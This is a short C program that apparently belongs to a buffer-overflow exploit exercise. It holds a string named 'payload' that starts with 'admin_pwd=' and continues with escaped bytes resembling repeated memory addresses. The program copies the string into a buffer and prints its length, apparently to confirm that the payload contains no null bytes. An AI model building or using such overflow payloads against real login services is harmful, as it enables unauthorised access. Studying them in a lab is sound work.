#include <string.h>
#include <stdio.h>



char payload[] = "admin_pwd=\273\273\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV\256\200UV&Qϡ\020\237UV&\260\377\367\030\316\377\377}qUV";


int main(int argc, char const *argv[])
{
	
	printf("%d\n", strlen(payload));
	char buf[strlen(payload)+1];
	strcpy(buf, payload);
	printf("%d\n", strlen(buf));

	return 0;
}